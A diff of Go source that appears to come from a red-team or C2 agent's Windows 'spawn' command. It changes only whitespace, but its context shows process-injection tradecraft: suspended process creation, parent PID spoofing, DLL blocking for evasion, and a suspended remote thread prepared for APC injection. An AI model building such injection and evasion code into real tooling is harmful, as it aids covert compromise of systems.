@@ -25,10 +25,10 @@ import (
 
 // Process creation flags
 const (
-	CREATE_SUSPENDED                = 0x00000004
-	EXTENDED_STARTUPINFO_PRESENT    = 0x00080000
-	CREATE_NEW_CONSOLE              = 0x00000010
-	CREATE_NO_WINDOW                = 0x08000000
+	CREATE_SUSPENDED             = 0x00000004
+	EXTENDED_STARTUPINFO_PRESENT = 0x00080000
+	CREATE_NEW_CONSOLE           = 0x00000010
+	CREATE_NO_WINDOW             = 0x08000000
 )
 
 // Thread creation flags
@@ -89,9 +89,9 @@ type PROC_THREAD_ATTRIBUTE_LIST struct{}
 // Note: kernel32, procOpenProcess, procCreateRemoteThread, procCloseHandle are defined in vanillainjection.go
 
 var (
-	procCreateProcessW                  = kernel32.NewProc("CreateProcessW")
-	procGetModuleHandleW                = kernel32.NewProc("GetModuleHandleW")
-	procGetProcAddressA                 = kernel32.NewProc("GetProcAddress")
+	procCreateProcessW                    = kernel32.NewProc("CreateProcessW")
+	procGetModuleHandleW                  = kernel32.NewProc("GetModuleHandleW")
+	procGetProcAddressA                   = kernel32.NewProc("GetProcAddress")
 	procInitializeProcThreadAttributeList = kernel32.NewProc("InitializeProcThreadAttributeList")
 	procUpdateProcThreadAttribute         = kernel32.NewProc("UpdateProcThreadAttribute")
 	procDeleteProcThreadAttributeList     = kernel32.NewProc("DeleteProcThreadAttributeList")
@@ -112,11 +112,11 @@ func (c *SpawnCommand) Description() string {
 
 // SpawnParams represents the parameters for spawn
 type SpawnParams struct {
-	Mode      string `json:"mode"`       // "process" or "thread"
-	Path      string `json:"path"`       // For process mode: executable path or name
-	PID       int    `json:"pid"`        // For thread mode: target process ID
-	PPID      int    `json:"ppid"`       // Parent PID spoofing (0 = don't spoof)
-	BlockDLLs bool   `json:"blockdlls"`  // Block non-Microsoft DLLs in spawned process
+	Mode      string `json:"mode"`      // "process" or "thread"
+	Path      string `json:"path"`      // For process mode: executable path or name
+	PID       int    `json:"pid"`       // For thread mode: target process ID
+	PPID      int    `json:"ppid"`      // Parent PID spoofing (0 = don't spoof)
+	BlockDLLs bool   `json:"blockdlls"` // Block non-Microsoft DLLs in spawned process
 }
 
 // Execute executes the spawn command
@@ -198,9 +198,9 @@ func spawnSuspendedProcess(path string, ppid int, blockDLLs bool) structs.Comman
 		// Determine attribute list size
 		var attrListSize uintptr
 		procInitializeProcThreadAttributeList.Call(
-			0,                                     // lpAttributeList (NULL for size query)
-			uintptr(attrCount),                    // dwAttributeCount
-			0,                                     // dwFlags (reserved)
+			0,                                      // lpAttributeList (NULL for size query)
+			uintptr(attrCount),                     // dwAttributeCount
+			0,                                      // dwFlags (reserved)
 			uintptr(unsafe.Pointer(&attrListSize)), // lpSize
 		)
 
@@ -417,10 +417,10 @@ func spawnSuspendedThread(pid int) structs.CommandResult {
 	var threadId uint32
 	hThread, _, err := procCreateRemoteThread.Call(
 		hProcess,
-		0,                              // lpThreadAttributes
-		0,                              // dwStackSize (default)
-		sleepAddr,                      // lpStartAddress
-		uintptr(0xFFFFFFFF),            // lpParameter (INFINITE sleep if ever resumed without APC)
+		0,                                // lpThreadAttributes
+		0,                                // dwStackSize (default)
+		sleepAddr,                        // lpStartAddress
+		uintptr(0xFFFFFFFF),              // lpParameter (INFINITE sleep if ever resumed without APC)
 		uintptr(THREAD_CREATE_SUSPENDED), // dwCreationFlags
 		uintptr(unsafe.Pointer(&threadId)),
 	)
